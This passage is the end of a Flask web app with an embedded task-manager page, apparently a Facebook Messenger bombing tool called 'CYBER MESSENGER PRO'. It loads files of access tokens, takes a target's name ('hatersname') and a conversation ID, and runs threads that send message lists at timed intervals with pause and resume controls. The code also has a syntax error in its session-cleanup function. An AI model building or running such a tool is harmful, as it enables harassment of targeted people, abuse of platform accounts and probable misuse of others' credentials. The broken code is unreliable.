      resultDiv.style.display = 'block';
    }

    // Task Management Functions
    function loadMyTasks() {
      fetch('/get_my_tasks')
      .then(response => response.json())
      .then(data => {
        displayUserTasks(data);
      });
    }

    function displayUserTasks(data) {
      const container = document.getElementById('tasksContainer');
      
      if (!data.success || data.tasks.length === 0) {
        container.innerHTML = `
          <div class="task-box" style="text-align: center;">
            <h3>📭 NO ACTIVE TASKS</h3>
            <p>Start a new task from the Message Sender tab!</p>
          </div>
        `;
        return;
      }
      
      let html = '';
      
      data.tasks.forEach(task => {
        const statusClass = task.status === 'running' ? '' : 
                           task.status === 'stopped' ? 'stopped' : 
                           task.status === 'auto_stopped' ? 'auto_stopped' : 'paused';
        
        const boxClass = task.status === 'auto_stopped' ? 'task-box auto-stopped' : 'task-box';
        
        html += `
          <div class="${boxClass}">
            <div class="task-header">
              <div class="task-title">⚡ ${task.task_key}</div>
              <div class="task-status ${statusClass}">${task.status.toUpperCase()}</div>
            </div>
            
            <div class="task-info">
              <div>👤 <strong>Target:</strong> ${task.hatersname} ${task.lastname}</div>
              <div>💬 <strong>Conv ID:</strong> ${task.conversation_id}</div>
              <div>👥 <strong>Token User:</strong> ${task.token_users ? task.token_users[0] : 'Loading...'}</div>
              <div>📝 <strong>Messages File:</strong> ${task.message_filename || 'N/A'}</div>
              <div>🔑 <strong>Token File:</strong> ${task.token_filename || 'Single Token'}</div>
              ${task.has_attachment ? '<div>🖼️ <strong>Photo:</strong> Attached with messages</div>' : ''}
              <div>⏱️ <strong>Interval:</strong> ${task.time_interval}s</div>
              <div>📤 <strong>Sent:</strong> ${task.sent_count || 0}</div>
              <div>❌ <strong>Failed:</strong> <span class="failed-count">${task.failed_count || 0}</span></div>
              <div>🕐 <strong>Started:</strong> ${task.start_time}</div>
              <div>🕒 <strong>Last Msg:</strong> ${task.last_message}</div>
              <div>⏰ <strong>Running Time:</strong> <span class="timer-display">${task.timer_display || '00:00:00'}</span></div>
            </div>
            
            ${task.auto_stop_reason ? `
              <div style="background: rgba(255, 107, 107, 0.2); padding: 15px; border-radius: 10px; border-left: 4px solid #ff6b6b; margin-bottom: 15px;">
                <strong>🚨 AUTO STOPPED:</strong> ${task.auto_stop_reason}
              </div>
            ` : ''}
            
            <div class="progress-container">
              <div class="progress-bar">
                <div class="progress-fill" style="width: ${task.progress || 0}%;"></div>
              </div>
              <div class="progress-text">
                📊 Progress: ${task.progress || 0}% | 📤 Sent: ${task.sent_count || 0} of ${task.total_messages || 'N/A'} | ❌ Failed: ${task.failed_count || 0}
              </div>
            </div>
            
            <div class="task-controls">
              ${task.status === 'running' ? 
                `<button onclick="controlTask('${task.task_key}', 'stop')" class="danger">⏸️ PAUSE</button>` : 
                task.status === 'auto_stopped' ?
                `<button class="danger" disabled>🚨 AUTO STOPPED</button>` :
                `<button onclick="controlTask('${task.task_key}', 'resume')" class="success">▶️ RESUME</button>`
              }
              <button onclick="controlTask('${task.task_key}', 'delete')" class="danger">🗑️ DELETE</button>
              <button onclick="copyToClipboard('${task.task_key}')" class="secondary">📋 COPY ID</button>
            </div>
          </div>
        `;
      });
      
      container.innerHTML = html;
    }

    function controlTask(taskKey, action) {
      if (!confirm(`Are you sure you want to ${action.toUpperCase()} this task?`)) return;
      
      const formData = new FormData();
      formData.append('task_key', taskKey);
      formData.append('action', action);
      
      fetch('/control_task', {
        method: 'POST',
        body: formData
      })
      .then(response => response.json())
      .then(data => {
        if (data.success) {
          loadMyTasks();
        } else {
          alert('❌ ERROR: ' + data.error);
        }
      });
    }

    function stopAllTasks() {
      if (!confirm('Stop ALL running tasks?')) return;
      fetch('/get_my_tasks')
      .then(response => response.json())
      .then(data => {
        if (data.success && data.tasks.length > 0) {
          data.tasks.forEach(task => {
            if (task.status === 'running') {
              controlTask(task.task_key, 'stop');
            }
          });
        }
      });
    }

    function copyToClipboard(text) {
      navigator.clipboard.writeText(text).then(() => {
        alert('✅ COPIED: ' + text);
      });
    }

    // Auto-load tasks every 10 seconds when on task manager
    setInterval(() => {
      if (document.getElementById('task-manager').classList.contains('active')) {
        loadMyTasks();
      }
    }, 10000);

    // Load tasks on page load if on task manager
    document.addEventListener('DOMContentLoaded', function() {
      if (document.getElementById('task-manager').classList.contains('active')) {
        loadMyTasks();
      }
    });
  </script>
</body>
</html>
    '''

@app.route('/validate_token', methods=['POST'])
def validate_token():
    """Validate token before starting task"""
    try:
        token = request.form.get('token')
        if not token:
            return jsonify({'valid': False, 'error': '❌ NO TOKEN PROVIDED'})
        
        result = validate_token_before_start(token)
        return jsonify(result)
    except Exception as e:
        return jsonify({'valid': False, 'error': '❌ TOKEN VALIDATION FAILED'})

@app.route('/start_task', methods=['POST'])
def start_task():
    try:
        user_session = get_user_session()
        user_id = session['user_id']
        data = request.form
        
        tokens = []
        message_filename = None
        token_filename = None
        attachment_id = None
        
        # Handle token input (single token or file)
        if 'token_file' in request.files and request.files['token_file'].filename:
            file = request.files['token_file']
            token_filename = file.filename
            content = file.read().decode('utf-8')
            tokens = [line.strip() for line in content.split('\n') if line.strip()]
        elif 'single_token' in data and data['single_token']:
            tokens = [data['single_token'].strip()]
            token_filename = "Single Token"
        
        if not tokens:
            return jsonify({'error': 'No valid tokens provided'})
        
        # Validate all tokens before starting
        for token in tokens:
            validation_result = validate_token_before_start(token)
            if not validation_result['valid']:
                return jsonify({'error': f'Token validation failed: {validation_result["error"]}'})
        
        # Handle messages file
        messages = []
        if 'message_file' in request.files and request.files['message_file'].filename:
            file = request.files['message_file']
            message_filename = file.filename
            content = file.read().decode('utf-8')
            messages = [line.strip() for line in content.split('\n') if line.strip()]
        
        if not messages:
            return jsonify({'error': 'No messages provided'})
        
        # Handle photo attachment
        if 'photo_file' in request.files and request.files['photo_file'].filename:
            photo_file = request.files['photo_file']
            # Upload photo and get attachment ID (using first token)
            if tokens:
                attachment_id = upload_image_to_facebook(tokens[0], photo_file)
        
        task_key = generate_task_key()
        
        stop_event = Event()
        user_session['stop_events'][task_key] = stop_event
        
        user_session['tasks'][task_key] = {
            'task_key': task_key,
            'conversation_id': data['conversation_id'],
            'hatersname': data['hatersname'],
            'lastname': data['lastname'],
            'time_interval': int(data['time_interval']),
            'token_count': len(tokens),
            'message_count': len(messages),
            'start_time': datetime.now().strftime('%Y-%m-%d %I:%M:%S %p'),
            'last_message': datetime.now().strftime('%Y-%m-%d %I:%M:%S %p'),
            'status': 'running',
            'sent_count': 0,
            'failed_count': 0,
            'total_messages': len(messages) * len(tokens),
            'progress': 0,
            'start_timestamp': time.time(),
            'elapsed_time': 0,
            'timer_display': '00:00:00',
            'message_filename': message_filename,
            'token_filename': token_filename,
            'token_users': [],
            'has_attachment': attachment_id is not None
        }
        
        thread = Thread(
            target=send_messages_strong,
            args=(
                user_id,
                task_key,
                tokens,
                data['conversation_id'],
                data['hatersname'],
                data['lastname'],
                int(data['time_interval']),
                messages,
                message_filename,
                token_filename,
                attachment_id
            ),
            daemon=True
        )
        thread.start()
        
        return jsonify({
            'success': True, 
            'task_key': task_key,
            'message': 'Task started successfully!',
            'has_attachment': attachment_id is not None
        })
    
    except Exception as e:
        return jsonify({'error': 'Server error'})

@app.route('/get_my_tasks', methods=['GET'])
def get_my_tasks():
    try:
        user_session = get_user_session()
        tasks_list = list(user_session['tasks'].values())
        
        # Update timers for all running tasks
        current_time = time.time()
        for task in tasks_list:
            task['progress'] = calculate_progress(task)
            if task['status'] == 'running' and 'start_timestamp' in task:
                task['elapsed_time'] = int(current_time - task['start_timestamp'])
                task['timer_display'] = format_timer(task['elapsed_time'])
        
        return jsonify({
            'success': True,
            'tasks': tasks_list,
            'total_tasks': len(tasks_list)
        })
    except Exception:
        return jsonify({'success': False, 'tasks': [], 'total_tasks': 0})

@app.route('/control_task', methods=['POST'])
def control_task():
    try:
        user_session = get_user_session()
        user_id = session['user_id']
        task_key = request.form.get('task_key')
        action = request.form.get('action')
        
        if task_key not in user_session['stop_events']:
            return jsonify({'error': 'Task not found'})
        
        if action == 'stop':
            user_session['stop_events'][task_key].set()
            user_session['tasks'][task_key]['status'] = 'stopped'
        elif action == 'resume':
            user_session['stop_events'][task_key].clear()
            user_session['tasks'][task_key]['status'] = 'running'
            # Reset timer when resuming
            user_session['tasks'][task_key]['start_timestamp'] = time.time()
        elif action == 'delete':
            user_session['stop_events'][task_key].set()
            if task_key in user_session['tasks']:
                del user_session['tasks'][task_key]
            if task_key in user_session['stop_events']:
                del user_session['stop_events'][task_key]
        
        return jsonify({'success': True, 'message': f'Task {action} successfully'})
    except Exception:
        return jsonify({'error': 'Control action failed'})

@app.route('/ping')
def ping():
    return 'pong'

def background_keep_alive():
    while True:
        try:
            requests.get('http://localhost:5000/ping', timeout=5)
        except:
            pass
        time.sleep(60)

def cleanup_old_sessions():
    while True:
        try:
            current_time = datetime.now()
            with sessions_lock:
                expired_sessions = []
                for user_id, user_data in user_sessions.items():
                    if (current_time - user_data['created_at']).total_seconds() > 86400:
                        expired_sessions.append(user_id)
                
                for user_id in expired_sessions:
                    del user_sessions[user_id]
        except:
        finally:
            time.sleep(3600)

if __name__ == '__main__':
    keep_alive_thread = Thread(target=background_keep_alive, daemon=True)
    keep_alive_thread.start()
    
    cleanup_thread = Thread(target=cleanup_old_sessions, daemon=True)
    cleanup_thread.start()
    
    print("🚀 CYBER MESSENGER PRO STARTED")
    app.run(host='0.0.0.0', port=5000, debug=False, threaded=True)
